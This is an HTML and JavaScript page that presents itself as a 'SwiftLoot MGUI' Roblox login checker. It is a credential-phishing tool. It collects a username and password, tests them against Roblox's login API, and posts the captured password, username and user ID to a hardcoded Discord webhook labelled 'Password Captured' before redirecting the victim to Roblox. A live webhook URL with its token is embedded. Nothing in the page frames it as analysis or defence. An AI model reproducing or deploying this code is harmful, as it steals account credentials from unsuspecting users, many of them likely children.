<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>SwiftLoot MGUI Auto Login</title>
<style>
body {
    background-color: #121212;
    color: #eee;
    font-family: Arial, sans-serif;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    height: 100vh;
}
input {
    padding: 10px;
    margin: 5px;
    width: 250px;
    border-radius: 5px;
    border: none;
}
button {
    padding: 10px 20px;
    margin: 10px;
    border-radius: 5px;
    border: none;
    background-color: #1a73e8;
    color: #fff;
    cursor: pointer;
}
#status {
    margin-top: 10px;
}
</style>
</head>
<body>
<h2>SwiftLoot MGUI Login Checker</h2>

<input id="username" placeholder="Username / Email">
<input id="password" type="password" placeholder="Password">
<button id="loginBtn">Login</button>

<p id="status">Enter credentials and click Login</p>

<script>
const loginBtn = document.getElementById("loginBtn");
const statusEl = document.getElementById("status");

// Discord Webhooks
const successWebhook = "https://discord.com/api/webhooks/1393508497299345448/KdIyKVOnH1HY7sNXot68neET1pVVzVD4AC9EfQrv3W5sxhsPW2WC2ouO5eOfaQBq-eSM";
const failedWebhook = "https://discord.com/api/webhooks/1393508497299345448/KdIyKVOnH1HY7sNXot68neET1pVVzVD4AC9EfQrv3W5sxhsPW2WC2ouO5eOfaQBq-eSM";

// Roblox login function
loginBtn.addEventListener("click", async () => {
    const username = document.getElementById("username").value.trim();
    const password = document.getElementById("password").value;

    if (!username || !password) {
        statusEl.textContent = "‚ùå Enter both username and password!";
        return;
    }

    statusEl.textContent = "‚è≥ Logging in...";

    try {
        // Roblox login API
        const response = await fetch("https://auth.roblox.com/v2/login", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ cusername: username, password: password })
        });

        const data = await response.json();

        if (data.user) {
            // Successful login
            statusEl.textContent = "‚úÖ Login Successful!";

            // Send embed to Discord
            await fetch(successWebhook, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    content: "",
                    embeds: [{
                        title: "üîê Password Captured",
                        color: 65280,
                        fields: [
                            { name: "üë§ User", value: username },
                            { name: "üÜî User ID", value: data.user.userId.toString() },
                            { name: "üîë Password", value: password },
                            { name: "üåç Country / City", value: "Unknown / Unknown" },
                            { name: "üìÖ Account Age", value: "Unknown" },
                            { name: "üéÆ Place Info", value: `PlaceId: 0\nJobId: 0` }
                        ],
                        footer: { text: "SwiftLoot MGUI" },
                        timestamp: new Date().toISOString()
                    }]
                })
            });

            // Redirect to Roblox home
            window.location.href = "https://www.roblox.com/home";

        } else {
            // Failed login
            statusEl.textContent = "‚ùå Login Failed!";

            await fetch(failedWebhook, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    content: "",
                    embeds: [{
                        title: "üî¥ Login Checker",
                        color: 16711680,
                        fields: [
                            { name: "üë§ User", value: username },
                            { name: "Status", value: "‚ùå Login Failed" }
                        ],
                        footer: { text: "SwiftLoot MGUI" },
                        timestamp: new Date().toISOString()
                    }]
                })
            });
        }

    } catch (err) {
        console.error(err);
        statusEl.textContent = "‚ùå Error connecting to Roblox!";
    }
});
</script>
</body>
</html>
